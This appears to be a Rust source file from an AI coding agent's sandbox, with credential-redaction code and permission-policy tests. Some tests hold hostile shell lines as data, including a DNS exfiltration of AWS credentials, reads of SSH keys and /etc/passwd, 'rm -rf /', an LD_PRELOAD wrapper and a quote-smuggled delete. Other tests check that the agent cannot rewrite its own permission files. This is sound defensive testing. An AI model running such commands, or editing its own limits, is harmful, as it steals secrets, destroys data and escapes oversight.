    for token in text.split_inclusive(char::is_whitespace) {
        let body = token.trim_end();
        let trail = &token[body.len()..];
        let lower = body.to_ascii_lowercase();
        if body.is_empty() {
        } else if hide_next && is_cipher_type(&lower) {
            out.push_str(body);
        } else if hide_next {
            out.push_str("[redacted]");
            hide_next = false;
        } else if let Some(i) = body.find(['=', ':']).filter(|&i| {
            i + 1 < body.len()
                && (is_password_key(&lower[..i], &prev)
                    || (is_secret_name(&lower[..i])
                        && !body[i + 1..]
                            .trim_matches(|c: char| !c.is_ascii_alphanumeric())
                            .bytes()
                            .all(|b| b.is_ascii_digit())))
        }) {
            out.push_str(&body[..=i]);
            out.push_str("[redacted]");
        } else {
            out.push_str(&redact_token(body));
            hide_next = is_password_key(&lower, &prev);
        }
        if !body.is_empty() {
            prev = lower;
        }
        if trail.contains('\n') {
            hide_next = false;
        }
        out.push_str(trail);
    }
    out
}

/// A word whose next word (or `=value`) is a password. `-p` only after
/// `sshpass`: elsewhere it is a port (`ssh -p 22`) or `mkdir -p`.
fn is_password_key(w: &str, prev: &str) -> bool {
    let w = w.trim_matches(|c: char| !c.is_ascii_alphanumeric());
    matches!(
        w,
        "password"
            | "passwd"
            | "pwd"
            | "pw"
            | "secret"
            | "community"
            | "key-string"
            | "pre-shared-key"
            | "psk"
            | "auth-key"
            | "authentication-key"
            | "bearer"
    ) || (w == "p" && prev == "sshpass")
}

/// A `name=value` / `"name":` key that holds a credential, any spelling:
/// `aws_secret_access_key`, `client-secret`, `GITHUB_TOKEN`, `apiKey`.
/// A purely numeric value (`max_tokens=100`) is left alone by the caller.
fn is_secret_name(k: &str) -> bool {
    let k: String = k
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .collect::<String>()
        .to_ascii_lowercase();
    [
        "secret",
        "token",
        "password",
        "passwd",
        "apikey",
        "privatekey",
    ]
    .iter()
    .any(|w| k.contains(w))
}

/// `-----BEGIN ... PRIVATE KEY-----` blocks, through their END line (or to
/// the end of the text when it is cut off).
fn redact_pem(text: &str) -> std::borrow::Cow<'_, str> {
    if !text.contains("PRIVATE KEY-----") {
        return text.into();
    }
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(start) = rest.find("-----BEGIN ") {
        let head = &rest[start..];
        let line_end = head.find('\n').unwrap_or(head.len());
        if !head[..line_end].contains("PRIVATE KEY-----") {
            out.push_str(&rest[..start + 11]);
            rest = &rest[start + 11..];
            continue;
        }
        out.push_str(&rest[..start]);
        out.push_str("[redacted]");
        rest = match head.find("-----END ") {
            Some(e) => {
                let tail = &head[e + 9..];
                match tail.find("-----") {
                    Some(f) => &tail[f + 5..],
                    None => "",
                }
            }
            None => "",
        };
    }
    out.push_str(rest);
    out.into()
}

/// Text that must not go into memory or a skill: a key-shaped string, or a
/// password written in prose ("a senha do roteador é X"), which no pattern
/// can cut out reliably. Credentials belong in the OS vault.
pub fn mentions_secret(text: &str) -> bool {
    if redact(text) != text {
        return true;
    }
    let lower = text.to_lowercase();
    [
        "senha",
        "password",
        "passwd",
        "community",
        "secret ",
        "secret_",
        "token de acesso",
        "api key",
        "chave de api",
    ]
    .iter()
    .any(|w| lower.contains(w))
}

/// Cisco `secret 5`, Huawei `password cipher`: the type word, not the secret.
fn is_cipher_type(w: &str) -> bool {
    matches!(
        w,
        "0" | "5" | "7" | "8" | "9" | "cipher" | "simple" | "irreversible-cipher"
    )
}

fn redact_token(token: &str) -> String {
    // The secret may sit inside JSON or `key=value`: `{"token":"eyJ…","n":1}`,
    // so every run of token characters is checked, not the word as a whole.
    let word = |c: char| c.is_ascii_alphanumeric() || "-_.~+/".contains(c);
    let mut out = String::with_capacity(token.len());
    let mut rest = token;
    while let Some(start) = rest.find(word) {
        out.push_str(&rest[..start]);
        let run = &rest[start..];
        let end = run.find(|c: char| !word(c)).unwrap_or(run.len());
        let core = run[..end].trim_end_matches('.');
        let core = if core.is_empty() { &run[..end] } else { core };
        out.push_str(if is_secret(core) { "[redacted]" } else { core });
        rest = &run[core.len()..];
    }
    out.push_str(rest);
    out
}

fn is_secret(s: &str) -> bool {
    let prefixes = [
        "sk-",
        "sk_",
        "ghp_",
        "gho_",
        "ghs_",
        "github_pat_",
        "glpat-",
        "xoxb-",
        "xoxp-",
        "xoxa-",
        "xoxs-",
        "xoxr-",
        "xapp-",
        "rk_live_",
        "rk_test_",
        "AKIA",
        "AIza",
    ];
    if prefixes.iter().any(|p| s.starts_with(p)) && s.len() > 12 {
        return true;
    }
    // A JWT: three base64url parts, the first one a JSON header.
    if s.starts_with("eyJ") && s.split('.').filter(|p| !p.is_empty()).count() == 3 {
        return true;
    }
    if s.len() > 40
        && s.chars()
            .all(|c| c.is_ascii_hexdigit() || c == '-' || c == '_')
    {
        return true;
    }
    is_random_base64(s)
}

/// A long base64 run that reads as random (an AWS secret key): upper, lower
/// and digits mixed, and no lowercase run long enough to be a word, so
/// `/Users/Joao/Documents/x2` or `SomeLongFunctionName2` stay readable.
/// ponytail: misses keys that happen to hold 6+ lowercase in a row; a real
/// entropy test would catch those at the cost of more false positives.
fn is_random_base64(s: &str) -> bool {
    let b = s.as_bytes();
    let mut run = 0;
    let mut max_run = 0;
    for &c in b {
        run = if c.is_ascii_lowercase() { run + 1 } else { 0 };
        max_run = max_run.max(run);
    }
    b.len() >= 32
        && max_run <= 5
        && b.iter()
            .all(|c| c.is_ascii_alphanumeric() || b"+/=-_".contains(c))
        && b.iter().any(u8::is_ascii_uppercase)
        && b.iter().any(u8::is_ascii_lowercase)
        && b.iter().any(u8::is_ascii_digit)
}

/// Redacts header-shaped text, where the secret follows the name.
pub fn redact_headers(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for line in text.split_inclusive('\n') {
        let lower = line.to_ascii_lowercase();
        if lower.contains("authorization:")
            || lower.contains("api-key:")
            || lower.contains("cookie:")
        {
            out.push_str("[redacted header]\n");
        } else {
            out.push_str(&redact(line));
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_key_is_replaced_and_ordinary_text_survives() {
        let s = redact("chave sk-f7949b9d5b2e4f1a e texto normal");
        assert_eq!(s, "chave [redacted] e texto normal");
    }

    #[test]
    fn jwts_google_keys_and_tokens_inside_json_are_redacted() {
        let jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.c2lnbmF0dXJh";
        let google = format!("AIza{}", "S".repeat(35));
        let pat = format!("github_pat_{}", "1".repeat(30));
        for (input, gone) in [
            (format!("token {jwt} fim"), jwt.to_string()),
            (format!("{{\"key\":\"{google}\",\"n\":1}}"), google.clone()),
            (format!("GITHUB_TOKEN={pat}"), pat.clone()),
            (
                format!("glpat-{} e xoxp-{}", "a".repeat(20), "b".repeat(20)),
                "a".repeat(20),
            ),
        ] {
            let out = redact(&input);
            assert!(!out.contains(&gone), "{input} -> {out}");
            assert!(out.contains("[redacted]"), "{out}");
        }
        assert_eq!(
            redact("{\"key\":\"AIzaXXXX\",\"n\":1}"),
            "{\"key\":\"AIzaXXXX\",\"n\":1}",
            "short text that only looks like a prefix stays"
        );
        let plain = "interface ether1 mtu=1500 comment=\"uplink: eyJ\" ok.";
        assert_eq!(redact(plain), plain);
        let h = redact_headers("GET /\nCookie: session=abc123\nSet-Cookie: id=9\nok\n");
        assert!(
            !h.contains("abc123") && !h.contains("id=9") && h.contains("ok"),
            "{h}"
        );
    }

    #[test]
    fn device_passwords_are_redacted_and_ordinary_flags_are_not() {
        for (input, gone) in [
            ("sshpass -p Admin@123 ssh admin@10.0.0.1", "Admin@123"),
            ("plink -batch -pw S3nh@ x@host", "S3nh@"),
            (
                "local-user admin password irreversible-cipher Abc123xyz",
                "Abc123xyz",
            ),
            ("enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0", "$1$mERr"),
            ("snmp-server community AlphanNet-86 RW", "AlphanNet-86"),
            ("/user add name=x password=Qwe!2025 group=full", "Qwe!2025"),
            ("{\"password\":\"segredo1\"}", "segredo1"),
        ] {
            let out = redact(input);
            assert!(!out.contains(gone), "{input} -> {out}");
        }
        for plain in [
            "ssh -p 22 admin@10.0.0.1",
            "mkdir -p src/a",
            "display current-configuration",
        ] {
            assert_eq!(redact(plain), plain);
        }
        assert_eq!(
            bare_program("C:/Windows/System32/OpenSSH/ssh.exe -V"),
            "ssh -V"
        );
        assert_eq!(
            bare_program("\"C:/Program Files/PuTTY/plink.exe\" -batch h"),
            "plink -batch h"
        );
    }

    #[test]
    fn an_authorization_header_never_reaches_a_log() {
        let s = redact_headers("GET /v1\nAuthorization: Bearer abc\nok\n");
        assert!(!s.contains("abc"));
        assert!(s.contains("GET /v1"));
    }

    #[test]
    fn the_default_preset_allows_writes_inside_and_asks_outside() {
        // Not the OS temp dir: it is ACL-restricted on this machine.
        let scratch =
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../target/test-scratch");
        std::fs::create_dir_all(&scratch).unwrap();
        let dir = tempfile::Builder::new().tempdir_in(scratch).unwrap();
        let ws = preset("workspace-write").unwrap();
        let policy = Policy::new(ws, Policy::default_mode(ws), dir.path());
        let inside = dir.path().join("a.txt");
        std::fs::write(&inside, "x").unwrap();
        assert_eq!(policy.check(&Action::Write(inside)), Verdict::Allow);
        assert!(matches!(
            policy.check(&Action::Write(outside("system.ini"))),
            Verdict::Ask(_)
        ));
    }

    #[test]
    fn a_link_to_outside_followed_by_dotdot_is_outside() {
        let ws = scratch_dir();
        let far = scratch_dir();
        std::fs::create_dir_all(far.path().join("deep")).unwrap();
        let link = ws.path().join("link");
        // A junction needs no admin rights on Windows; a symlink on Unix.
        #[cfg(windows)]
        let made = std::process::Command::new("cmd")
            .args(["/C", "mklink", "/J"])
            .arg(&link)
            .arg(far.path().join("deep"))
            .output()
            .is_ok_and(|o| o.status.success());
        #[cfg(unix)]
        let made = std::os::unix::fs::symlink(far.path().join("deep"), &link).is_ok();
        if !made {
            eprintln!("sem link de diretório nesta máquina; teste pulado");
            return;
        }
        let p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::AcceptEdits,
            ws.path(),
        );
        // link/../x is far/x as the OS walks it.
        let escaped = p.check(&Action::Write(PathBuf::from("link/../x.txt")));
        assert!(matches!(escaped, Verdict::Ask(_)), "{escaped:?}");
        let plain = p.check(&Action::Write(PathBuf::from("sub/../ok.txt")));
        assert_eq!(plain, Verdict::Allow);
    }

    #[test]
    fn read_only_denies_every_write() {
        let policy = Policy::new(preset("read-only").unwrap(), Mode::Bypass, ".");
        assert!(matches!(
            policy.check(&Action::Write(PathBuf::from("a"))),
            Verdict::Deny(_)
        ));
    }

    /// An absolute path outside any test workspace on this OS (`C:/Windows/x`
    /// is a relative path on Linux, so it would land inside the workspace).
    fn outside(name: &str) -> PathBuf {
        PathBuf::from(if cfg!(windows) { "C:/Windows" } else { "/etc" }).join(name)
    }

    fn scratch_dir() -> tempfile::TempDir {
        let scratch =
            std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../target/test-scratch");
        std::fs::create_dir_all(&scratch).unwrap();
        tempfile::Builder::new().tempdir_in(scratch).unwrap()
    }

    /// `shell(python *)` allowed, and the model wrote `cd . && python -m
    /// unittest`: refused, a wasted step. A `cd` inside the workspace is now
    /// transparent to the allow rule; a `cd` out of it still is not.
    #[test]
    fn a_cd_inside_the_workspace_does_not_block_an_allow_rule() {
        let dir = scratch_dir();
        std::fs::create_dir_all(dir.path().join("sub")).unwrap();
        let mut p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::AcceptEdits,
            dir.path(),
        );
        p.rules = vec![Rule::parse(RuleKind::Allow, "shell(python *)").unwrap()];
        let sh = |c: &str| p.check_tool("shell", &Action::Shell(c.into()));
        assert_eq!(sh("python -m unittest"), Verdict::Allow);
        assert_eq!(sh("cd . && python -m unittest"), Verdict::Allow);
        assert_eq!(sh("cd sub && python x.py"), Verdict::Allow);
        let out = outside("x").parent().unwrap().display().to_string();
        assert_ne!(sh(&format!("cd {out} && python x.py")), Verdict::Allow);
        assert_ne!(sh("cd ~ && python x.py"), Verdict::Allow);
        assert_ne!(sh("cd .. && python x.py"), Verdict::Allow);
        assert_ne!(
            sh("cd . && rm -rf x"),
            Verdict::Allow,
            "the rest still needs the rule"
        );
    }

    #[test]
    fn modes_decide_how_often_the_user_is_asked() {
        let dir = scratch_dir();
        let ws = preset("workspace-write").unwrap();
        let file = Action::Write(dir.path().join("a.txt"));
        let read_out = Action::Read(outside("win.ini"));
        let shell = Action::Shell("cargo test".into());

        let p = Policy::new(ws, Mode::Default, dir.path());
        assert!(matches!(p.check(&file), Verdict::Ask(_)));
        assert_eq!(p.check(&Action::Read(dir.path().join("x"))), Verdict::Allow);
        assert!(matches!(p.check(&read_out), Verdict::Ask(_)));

        let p = Policy::new(ws, Mode::AcceptEdits, dir.path());
        assert_eq!(p.check(&file), Verdict::Allow);
        assert!(matches!(p.check(&shell), Verdict::Ask(_)));

        let p = Policy::new(ws, Mode::Plan, dir.path());
        assert!(matches!(p.check(&file), Verdict::Deny(_)));
        assert!(matches!(p.check(&shell), Verdict::Deny(_)));

        let p = Policy::new(ws, Mode::Bypass, dir.path());
        assert_eq!(p.check(&shell), Verdict::Allow);
        assert_eq!(p.check(&read_out), Verdict::Allow);

        // Listing the project never asks (it used to: `find` was unknown),
        // while a find that deletes or runs still does.
        if shellparse::Dialect::NATIVE() == shellparse::Dialect::Sh {
            let p = Policy::new(ws, Mode::AcceptEdits, dir.path());
            let sh = |c: &str| p.check(&Action::Shell(c.into()));
            assert_eq!(
                sh("find . -type f -not -path './.git/*' | head -100"),
                Verdict::Allow
            );
            assert!(matches!(
                sh("find . -name '*.pyc' -delete"),
                Verdict::Ask(_)
            ));
        }
    }

    /// `type C:\Windows\win.ini` reads a file: the same guard as `read_file`,
    /// and read deny rules apply. `type x.txt` inside the workspace stays free.
    #[test]
    fn a_read_only_shell_line_cannot_read_around_the_guard() {
        let dir = scratch_dir();
        let mut p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::Default,
            dir.path(),
        );
        std::fs::write(dir.path().join("a.txt"), "x").unwrap();
        let sh = |p: &Policy, c: &str| p.check_tool("shell", &Action::Shell(c.into()));
        // `/b` is a flag to cmd and a path to sh: this line is the same on both.
        assert_eq!(sh(&p, "echo oi"), Verdict::Allow);
        assert_eq!(sh(&p, "type a.txt"), Verdict::Allow);
        assert!(
            matches!(
                sh(&p, &format!("type {}", outside("win.ini").display())),
                Verdict::Ask(_)
            ),
            "a read outside the workspace asks, like read_file"
        );
        p.rules = vec![Rule::parse(RuleKind::Deny, "read_file(*.env)").unwrap()];
        assert!(matches!(sh(&p, "type .env"), Verdict::Deny(_)));
    }

    /// Writing the files that decide the agent's own limits is never automatic,
    /// not even in accept-edits where everything inside the workspace is.
    #[test]
    fn the_agent_cannot_rewrite_its_own_permissions_unasked() {
        let dir = scratch_dir();
        let p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::AcceptEdits,
            dir.path(),
        );
        std::fs::create_dir_all(dir.path().join(".zerith")).unwrap();
        for own in [
            ".zerith/settings.toml",
            ".mcp.json",
            ".git/hooks/pre-commit",
            ".git/config",
        ] {
            let v = p.check(&Action::Write(dir.path().join(own)));
            assert!(matches!(v, Verdict::Ask(_)), "{own}: {v:?}");
        }
        let plain = p.check(&Action::Write(dir.path().join("src/main.rs")));
        assert_eq!(
            plain,
            Verdict::Allow,
            "an ordinary file still needs no prompt"
        );
    }

    #[test]
    fn rules_resolve_deny_before_ask_before_allow() {
        let dir = scratch_dir();
        let mut p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::Default,
            dir.path(),
        );
        p.rules = vec![
            Rule::parse(RuleKind::Allow, "shell(cargo *)").unwrap(),
            Rule::parse(RuleKind::Deny, "shell(cargo publish*)").unwrap(),
            Rule::parse(RuleKind::Ask, "read_file(*.env)").unwrap(),
            Rule::parse(RuleKind::Allow, "read_file").unwrap(),
        ];
        let sh = |c: &str| p.check_tool("shell", &Action::Shell(c.into()));
        assert_eq!(sh("cargo test --all"), Verdict::Allow);
        assert!(matches!(sh("cargo publish"), Verdict::Deny(_)));
        assert!(matches!(sh("rm -rf /"), Verdict::Ask(_)));
        let env = Action::Read(dir.path().join("config").join(".ENV"));
        assert!(matches!(p.check_tool("read_file", &env), Verdict::Ask(_)));
        let other = Action::Read(dir.path().join("src").join("main.rs"));
        assert_eq!(p.check_tool("read_file", &other), Verdict::Allow);
    }

    #[test]
    fn an_allow_rule_does_not_lift_a_preset_deny() {
        let mut p = Policy::new(preset("read-only").unwrap(), Mode::Default, ".");
        p.rules = vec![Rule::parse(RuleKind::Allow, "write_file").unwrap()];
        assert!(matches!(
            p.check_tool("write_file", &Action::Write(PathBuf::from("a"))),
            Verdict::Deny(_)
        ));
    }

    #[test]
    fn glob_handles_stars_and_double_stars() {
        assert!(glob_match("*.rs", "main.rs", true));
        assert!(!glob_match("*.rs", "src/main.rs", true));
        assert!(glob_match("**/*.rs", "src/a/main.rs", true));
        assert!(glob_match("**/*.rs", "main.rs", true));
        assert!(glob_match("src/?.rs", "src/a.rs", true));
        assert!(glob_match("cargo test*", "cargo test -p x/y", false));
        assert!(!glob_match("cargo test*", "cargo build", false));
    }

    #[test]
    fn an_unknown_preset_is_an_error_not_a_wider_default() {
        std::env::set_var("ZERITH_SANDBOX", "no-such-preset");
        let err = Policy::from_env(".").unwrap_err();
        std::env::remove_var("ZERITH_SANDBOX");
        assert!(err.contains("unknown sandbox preset"));
    }

    #[test]
    fn compound_allow_rule_does_not_bypass_readonly_file_guards() {
        let dir = scratch_dir();
        let mut p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::Default,
            dir.path(),
        );
        p.rules = vec![
            Rule::parse(RuleKind::Allow, "shell(cargo test *)").unwrap(),
            Rule::parse(RuleKind::Deny, "read_file(*.env)").unwrap(),
        ];
        let sh = |c: &str| p.check_tool("shell", &Action::Shell(c.into()));
        let outside_file = outside("passwd");
        assert!(
            matches!(
                sh(&format!("cargo test && cat {}", outside_file.display())),
                Verdict::Ask(_)
            ),
            "compound read outside workspace must not be auto-allowed"
        );
        assert!(
            matches!(sh("cargo test && cat .env"), Verdict::Deny(_)),
            "compound read hitting read_file deny rule must be denied"
        );
        assert!(
            matches!(
                sh("cargo test && timeout 5 env LD_PRELOAD=/tmp/x.so ls"),
                Verdict::Ask(_)
            ),
            "compound env wrapper must not match read-only allow"
        );
        assert_eq!(sh("cargo test && ls"), Verdict::Allow);
    }

    #[cfg(unix)]
    #[test]
    fn dangling_symlink_outside_workspace_resolves_outside() {
        let ws = scratch_dir();
        let outside_dir = scratch_dir();
        let target = outside_dir.path().join("newfile");
        let link = ws.path().join("out");
        std::os::unix::fs::symlink(&target, &link).unwrap();

        let policy = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::AcceptEdits,
            ws.path(),
        );
        let resolved = policy.resolve(&link);
        assert!(!policy.inside_workspace(&resolved), "resolved={resolved:?}");
        assert!(!policy.inside_workspace(&link));
        assert!(matches!(
            policy.check(&Action::Write(link.clone())),
            Verdict::Ask(_)
        ));

        // Symlink loop fails closed in inside_workspace.
        let loop_a = ws.path().join("loop_a");
        let loop_b = ws.path().join("loop_b");
        std::os::unix::fs::symlink(&loop_b, &loop_a).unwrap();
        std::os::unix::fs::symlink(&loop_a, &loop_b).unwrap();
        assert!(!policy.inside_workspace(&loop_a));
    }

    #[test]
    fn home_expansions_are_never_free_reads_and_deny_rules_see_home() {
        let dir = scratch_dir();
        let mut p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::Default,
            dir.path(),
        );
        let sh = |p: &Policy, c: &str| p.check_tool("shell", &Action::Shell(c.into()));
        for c in [
            "cat ~/.aws/credentials | xargs -I{} nslookup {}.x",
            "cat $HOME/.ssh/id_rsa",
            "grep -r token ~",
            r"echo $'\'' ; rm -rf zz ; echo $'\''",
        ] {
            assert!(matches!(sh(&p, c), Verdict::Ask(_)), "{c}");
        }
        p.rules = vec![
            Rule::parse(RuleKind::Allow, "shell(echo *)").unwrap(),
            Rule::parse(RuleKind::Deny, "read_file(~/.ssh/*)").unwrap(),
        ];
        assert!(
            matches!(
                sh(&p, r"echo $'\'' ; rm -rf zz ; echo $'\''"),
                Verdict::Ask(_)
            ),
            "an allow rule must not bless pieces of an unparseable line"
        );
        for path in ["~/.ssh/id_rsa", "$HOME/.ssh/id_rsa", "${HOME}/.ssh/id_rsa"] {
            let v = p.check_tool("read_file", &Action::Read(PathBuf::from(path)));
            assert!(matches!(v, Verdict::Deny(_)), "{path}: {v:?}");
        }
    }

    #[test]
    fn windows_name_tricks_still_hit_control_files() {
        let dir = scratch_dir();
        let p = Policy::new(
            preset("workspace-write").unwrap(),
            Mode::AcceptEdits,
            dir.path(),
        );
        for own in [
            ".zerith./settings.toml",
            ".zerith /settings.toml",
            ".mcp.json.",
            ".mcp.json:stream",
            ".git/config::$DATA",
        ] {
            assert!(p.is_own_control(&dir.path().join(own)), "{own}");
        }
        assert!(!p.is_own_control(&dir.path().join("src/main.rs")));
    }

    #[test]
    fn more_credential_shapes_are_redacted() {
        let aws = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";
        for (input, gone) in [
            (format!("aws_secret_access_key={aws}"), aws.to_string()),
            (format!("key {aws} fim"), aws.to_string()),
            ("client_secret=abc123def".into(), "abc123def".into()),
            ("{\"apiKey\":\"hunter2x\"}".into(), "hunter2x".into()),
            ("curl -H x Bearer abcdef123 y".into(), "abcdef123".into()),
            (format!("rk_live_{}", "a1".repeat(12)), "a1a1a1".into()),
            (format!("xapp-{}", "1".repeat(20)), "1".repeat(20)),
            (format!("xoxa-{}", "2".repeat(20)), "2".repeat(20)),
            (
                "x\n-----BEGIN RSA PRIVATE KEY-----\nMIIEow\nabc\n-----END RSA PRIVATE KEY-----\ny"
                    .into(),
                "MIIEow".into(),
            ),
        ] {
            let out = redact(&input);
            assert!(!out.contains(&gone), "{input} -> {out}");
        }
        for plain in [
            "max_tokens=1024",
            "/Users/Joao/Documents/PROJETOS PESSOAIS/zerith/crates/x2",
            "SomeVeryLongFunctionNameForTesting123",
            "-----BEGIN CERTIFICATE----- ok",
        ] {
            assert_eq!(redact(plain), plain);
        }
        assert!(mentions_secret("my secret_value here"));
    }

    #[test]
    fn action_for_maps_multi_edit_to_write() {
        let dir = scratch_dir();
        let p = Policy::new(preset("workspace-write").unwrap(), Mode::Plan, dir.path());
        let args = serde_json::json!({"path": "src/lib.rs"});
        assert_eq!(
            p.action_for("multi_edit", &args),
            Some(Action::Write(dir.path().join("src/lib.rs")))
        );
        assert!(matches!(
            p.check_call("multi_edit", &args),
            Some(Verdict::Deny(_))
        ));
    }
}
